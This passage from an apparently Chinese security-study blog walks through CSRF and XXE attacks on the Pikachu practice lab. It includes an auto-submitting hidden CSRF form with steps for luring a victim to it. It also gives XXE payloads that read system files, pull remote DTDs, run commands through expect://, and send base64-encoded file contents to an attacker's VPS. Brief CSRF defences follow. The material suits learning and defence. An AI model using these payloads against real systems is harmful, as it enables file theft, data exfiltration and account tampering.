<p>然后将复制的代码写成一个网页，加入一些具有诱惑性的css界面，即可诱惑他人点击就可以，掌握对方的权限</p>
<p>如</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414171055022.png"
                      alt="image-20230414171055022"
                ></p>
<h2 id="pikachu靶场演示"><a href="#pikachu靶场演示" class="headerlink" title="pikachu靶场演示"></a>pikachu靶场演示</h2><h6 id="CSRF（get）"><a href="#CSRF（get）" class="headerlink" title="CSRF（get）"></a>CSRF（get）</h6><p>抓包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414171242474.png"
                      alt="image-20230414171242474"
                ></p>
<p>然后发现各个数值的值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414171341191.png"
                      alt="image-20230414171341191"
                ></p>
<p>复制拼接到url中同时修改数值，将add地址修改为nihao，提交</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414171519215.png"
                      alt="image-20230414171519215"
                ></p>
<p>成功修改</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414171611509.png"
                      alt="image-20230414171611509"
                ></p>
<h6 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h6><p>按正常步骤抓包</p>
<p>会发现它没有以字符串的形式传输值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414181029205.png"
                      alt="image-20230414181029205"
                ></p>
<p>以post形式请求的需要，将利用该漏洞的html文件，放在自己的服务器上，并且用户要访问这个文件</p>
<p>首先要编写html攻击文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;script&gt;                                                                                                       &lt;!-- 这个script是用来自动提交表单的 --&gt;</span><br><span class="line">        window.onload = function() &#123;</span><br><span class="line">        document.getElementById(&quot;submit&quot;).click();</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;              </span><br><span class="line">    &lt;body&gt;</span><br><span class="line">            &lt;form action=&quot;http://127.0.0.1/pikachu-master/vul/csrf/csrfpost/csrf_post_edit.php&quot; method=&quot;POST&quot;&gt;    </span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;girl&quot; /&gt;</span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;12345678922&quot; /&gt;</span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;usa&quot; /&gt;</span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;xiannv@pikachu.com&quot; /&gt;</span><br><span class="line">                &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">	            &lt;input id=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Submit request&quot; style=&quot;display:none&quot;/&gt;                    &lt;!-- style设置为display:none起到隐藏submit按钮的作用 --&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt; </span><br><span class="line"></span><br><span class="line">保存为post.html文件</span><br></pre></td></tr></table></figure></div>

<p>在攻击机上开一个http服务</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure></div>

<p>再将链接发送给对方</p>
<p>访问即可</p>
<h6 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF(Token)"></a>CSRF(Token)</h6><p>这是一个CSRF防范的一种方法利用Token值进行验证</p>
<p>抓包发现具有Token</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414172344136.png"
                      alt="image-20230414172344136"
                ></p>
<p>我们尝试删除token值看看能不能绕过</p>
<p>把手机号改了，提交</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414172527433.png"
                      alt="image-20230414172527433"
                ></p>
<p>发现没啥用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230414172714453.png"
                      alt="image-20230414172714453"
                ></p>
<p>参考别人的文章</p>
<p>获取token，再到另一个浏览器上面登入，构造payload包含此token也没啥用</p>
<p>服务器中会比较token字段和session的token字段，相同才会修改用户信息</p>
<p>修改之后会生成一个新的token，返回到html表单中并隐藏起来，用于下次的用户信息修改</p>
<p>并且在生成新token之前会销毁老token避免重复使用</p>
<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><h6 id="token随机"><a href="#token随机" class="headerlink" title="token随机"></a>token随机</h6><p>原理是利用这个的随机性来让服务器进行验证，如果没有token或者token不正确则认为可能是CSRF攻击</p>
<h6 id="referer校验"><a href="#referer校验" class="headerlink" title="referer校验"></a>referer校验</h6><p>referer记录了该http请求的来源地址，如果记录的不是同一个浏览器的请求，那可能是攻击者伪造的链接</p>
]]></content>
  </entry>
  <entry>
    <title>XXE</title>
    <url>/2023/05/15/XXE/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221012145304519.png"
                      alt="image-20221012145304519"
                ></p>
<h2 id="XML和XXE区别"><a href="#XML和XXE区别" class="headerlink" title="XML和XXE区别"></a>XML和XXE区别</h2><p>XML 被设计为传输和存储数据，XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从 HTML 分离，是独立于软件和硬件的信息传输工具。</p>
<p>XXE 漏洞全称XML External Entity Injection，即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害</p>
<h2 id="XML和HTML的区别"><a href="#XML和HTML的区别" class="headerlink" title="XML和HTML的区别"></a>XML和HTML的区别</h2><p>XML 与 HTML 的主要差异：XML 被设计为传输和存储数据，其焦点是数据的内容。HTML 被设计用来显示数据，其焦点是数据的外观。HTML 旨在显示信息 ，而 XML 旨在传输信息。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230415110401137.png"
                      alt="image-20230415110401137"
                ></p>
<p>XML文档有自己的格式规范，由一个叫做DTD的东西控制的</p>
<p>如</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br></pre></td></tr></table></figure></div>

<p>这个DTD就定义了XML的根元素是message，然后根元素下面有一些子元素，这就定义了这个XML必须像下面这样写</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;message&gt;</span><br><span class="line">&lt;receiver&gt;Myself&lt;/receiver&gt;</span><br><span class="line">&lt;sender&gt;Someone&lt;/sender&gt;</span><br><span class="line">&lt;header&gt;TheReminder&lt;/header&gt;</span><br><span class="line">&lt;msg&gt;This is an amazing book&lt;/msg&gt;</span><br><span class="line">&lt;/message&gt;</span><br></pre></td></tr></table></figure></div>



<p>但是除了用DTD定义元素（其实就是标签）之外，还可以定义实体（就是标签里面的内容）</p>
<p>如</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</span><br></pre></td></tr></table></figure></div>

<p>上面的ANY说明接受任何元素，我们定义了一个test的实体，这样我们就可以在其他代码中引用这个实体，如</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure></div>

<p>通过&amp;xxe这个代码来进行应用刚才定义的实体，输出的时候&amp;xxe;就会被替换成test</p>
<h2 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h2><h3 id="一"><a href="#一" class="headerlink" title="一"></a>一</h3><p>其实实体分为两种，外部实体和内部实体，上面的例子是内部实体，实体也可以从外部的.dtd文件中应用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;   外部文件导入</span><br><span class="line"></span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;/user&gt;           引用这个导入的文件</span><br><span class="line">    &lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure></div>

<p>这样的话要更改实体非常的方便，这就是外部实体</p>
<p>还有一种引用方式就是引用公用DTD的方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure></div>

<p>也是和SYSTEM一样的效果</p>
<h3 id="二"><a href="#二" class="headerlink" title="二"></a>二</h3><p>实体除了按内外部划分之外，还能从另一个角度划分为通用实体和参数实体</p>
<p>1.通用实体</p>
<p>用<code>&amp;实体名;</code>这种形式引用实体，在DTD中定义，在XML文档中引用（就是上面的例子的实体类型）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;/firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;/updateProfile&gt;</span><br></pre></td></tr></table></figure></div>

<p>2.参数实体</p>
<p>使用<code>% 实体名</code>（%和实体名之间有个空格，不能少）在DTD中定义，但是这个只能在DTD中使用<code>%实体名;</code>（没有空格）引用</p>
<p>只有在DTD文件中，参数实体的声明才能引用其他实体</p>
<p>和通用实体一样，参数实体也可以外部引用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure></div>



<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>上面我们清楚了外部实体是什么东西之后，我们就可以思考该怎么去利用来实行攻击</p>
<p>如这个代码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure></div>

<p>我们可以想得到既然它可以调用读取外部的.dtd文件，那么我们可不可以将路径换一下读取敏感文件呢，如win.ini</p>
<h4 id="实验1-有回显的敏感文件读取"><a href="#实验1-有回显的敏感文件读取" class="headerlink" title="实验1 有回显的敏感文件读取"></a>实验1 有回显的敏感文件读取</h4><p>场景是服务器能够解析XML代码，并且有回显</p>
<p>所以我们先写一段能解析XML代码的php文件</p>
<p>xml.php</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (false);</span><br><span class="line">    $xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    echo $creds;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>将这个文件放入phpstudy的www文件夹下，并访问</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230415164710822.png"
                      alt="image-20230415164710822"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230415164843614.png"
                      alt="image-20230415164843614"
                ></p>
<p>构造payload</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230415165039422.png"
                      alt="image-20230415165039422"
                ></p>
<p>没反应，绝了</p>
<p>看别人的实例吧</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230415170123309.png"
                      alt="image-20230415170123309"
                ></p>
<p>就是会读取system.ini文件内容，这样就利用成功了</p>
<p>但是如果读取的文件里面有特殊符号，就会造成错误</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230415170314022.png"
                      alt="image-20230415170314022"
                ></p>
<p>他的主要原因是因为有些内容不想让解析引擎解析执行，而是当作原始的内容处理，所以就解析成纯字符的形式</p>
<p>但是CDATA中的所有字符就被当作元素字符数据的常量部分，而不是xml标记</p>
<p>所以我们可以利用在CDATA中输出所需要读取的文件就可以绕开报错了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;![CDATA[   里面是读取的文件字符   ]]&gt;    </span><br></pre></td></tr></table></figure></div>

<p>接下来就是让文件字符出现在CDATA里面了，但是xml并没有提供拼接的函数，所以得换个思路</p>
<p>使用参数实体进行拼接</p>
<p>payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"></span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure></div>

<p>上面dtd使用引用通用实体将<code>&quot;&lt;![CDATA[&quot;</code>    <code>&quot;file:///d:/test.txt&quot;</code>       <code>&quot;]]&quot;</code>这三个进行定义</p>
<p>然后就会调用evil.dtd的内容用参数实体定义，将这三个拼接并解析</p>
<p>然后回到上面<code>&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code>引用输出</p>
<p>evil.dtd</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230415171725842.png"
                      alt="image-20230415171725842"
                ></p>
<p>就可以输出带有特殊字符的文件了</p>
<h6 id="但是！"><a href="#但是！" class="headerlink" title="但是！"></a>但是！</h6><p>xml他就不是用来输出的，一般是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析xml类</p>
<p>所以有回显的方法一般没啥用，需要一个无回显读取的方法——外带</p>
<p>想要外带我们必须要能发起请求，显然外部实体定义的时候就可以发起请求，</p>
<p>我们还要把数据传出去，传输数据也是一种请求，所以用套娃在请求中请求（具体说应该是在请求中调用另一次请求的结果）</p>
<h4 id="实验二-无回显的本地敏感文件读取"><a href="#实验二-无回显的本地敏感文件读取" class="headerlink" title="实验二 无回显的本地敏感文件读取"></a>实验二 无回显的本地敏感文件读取</h4><p>xml.php</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>test.did</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &#x27;http://ip(vps):9999?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></div>

<p>由于解析问题，所以需要将send前面的%用<code>&amp;#37;</code>替代</p>
<p>payload</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip (被攻击)/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></div>

<p>上面的teat.did代码第一行定义了一个参数实体%file用于读取test.txt文件的信息，然后用于第二行中</p>
<p>的文件传输</p>
<p>利用过程就是payload中的%remote调用请求远程服务器上的test.dtd文件，然后test.dtd文件中%int就会被调用，这就导致了第一行代码%file就会被调用，用于读取服务器上面的敏感文件test.txt，然后看第二行代码%send就会将敏感文件传输至自己的vps上，这样就解决了xxe没有回显的情况，实现了敏感数据外带</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230415182202947.png"
                      alt="image-20230415182202947"
                ></p>
<p>结果</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230415182214942.png"
                      alt="image-20230415182214942"
                ></p>
<p>各种协议的脚本适用环境</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i0.hdslb.com/bfs/article/8f7e9203dee418ddd2333e490ab2cc22d2171fa7.png@831w_284h_progressive.webp"
                      alt="img"
                ></p>
<p>#读取文件</p>
<p>—用file伪协议读取c盘的1.txt文件，当然这里的伪协议是隐藏在XML的文档实体中</p>
<p>—这种是有回显的类型的漏洞</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;       //xml的声明</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY [              //文档的类型定义：这里是所有的格式都可以</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c://1.txt&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;                           //文档的实体，xxe为实体里面的变量，下面就执行这个变量</span><br><span class="line"></span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure></div>

<p>#玩法-内网探针或攻击内网应用（触发漏洞地址）</p>
<p>—这里是探针内网端口对应的网站（相当于进行了端口扫描）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;         //XML声明</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE foo [                                //文档声明</span><br><span class="line"></span><br><span class="line">&lt;!ELEMENT foo ANY &gt;                            //文档的类型</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;http:// 192.168.102.143:8888/1.txt&quot; &gt;</span><br><span class="line"></span><br><span class="line">]&gt;                                             //文档的实体</span><br><span class="line"></span><br><span class="line">&lt;x&gt;&amp;rabbit;&lt;/x&gt;</span><br></pre></td></tr></table></figure></div>

<p>#玩法-RCE（该 CASE 是在安装 expect 扩展的 PHP 环境里执行系统命令）</p>
<p>— RCE是远程命令执行漏洞</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure></div>

<p>#引入外部实体dtd</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">        </span><br><span class="line">        &lt;!ENTITY % FILE SYSTEM &quot;HTTP://127.0.0.1:8081/evil2.dtd&quot;&gt;</span><br><span class="line">        </span><br><span class="line">        %file;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;x&gt;send;&lt;/x&gt;</span><br><span class="line"></span><br><span class="line">evil2.dtd:</span><br><span class="line">这个文件里面的内容：&lt;!ENTITY send SYSTEM&quot;file&quot;///d:/test.txt&quot;&gt;</span><br></pre></td></tr></table></figure></div>

<p>#无回显-读取文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=1.txt&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.102.143:8888/test.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">%dtd;</span><br><span class="line"></span><br><span class="line">%send;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test.dtd</span><br><span class="line">&lt;!ENTITY % payload</span><br><span class="line"></span><br><span class="line">&quot;&lt;!ENTITY &amp;#X25; send system</span><br><span class="line"></span><br><span class="line">&#x27;http://192.168.0.103:8081/?data=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure></div>

<p>#协议-读文件（绕过）</p>
<p>参考：<a class="link"   href="https://www.cnblogs.com/201752111yz/p/11413335.html" >https://www.cnblogs.com/201752111yz/p/11413335.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY [ &lt;!entity f system</span><br><span class="line"></span><br><span class="line">&quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure></div>



<h4 id="pikachu靶场实践"><a href="#pikachu靶场实践" class="headerlink" title="pikachu靶场实践"></a>pikachu靶场实践</h4><p>我们可以通过pikachu靶场来进行实践</p>
<h6 id="file-x2F-x2F-协议"><a href="#file-x2F-x2F-协议" class="headerlink" title="file&#x2F;&#x2F;协议"></a>file&#x2F;&#x2F;协议</h6><p>先在桌面创建一个111.txt文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230416135716825.png"
                      alt="image-20230416135716825"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230416135749770.png"
                      alt="image-20230416135749770"
                ></p>
<p>在输入框中输入payload，读取路径下的111.txt文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///C:/Users/hc/Desktop/111.txt&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure></div>

<p>读取成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230416135912842.png"
                      alt="image-20230416135912842"
                ></p>
<p>同理可以用来读取系统中的敏感文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230416140017335.png"
                      alt="image-20230416140017335"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE creds [ </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///C:/windows/win.ini&quot;&gt; ]&gt;  </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure></div>

<p>读取成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230416140102058.png"
                      alt="image-20230416140102058"
                ></p>
<h6 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h6><p>xxe也支持http的url格式，所以可以产生与ssrf一样的请求效果，可以用作内网探测</p>
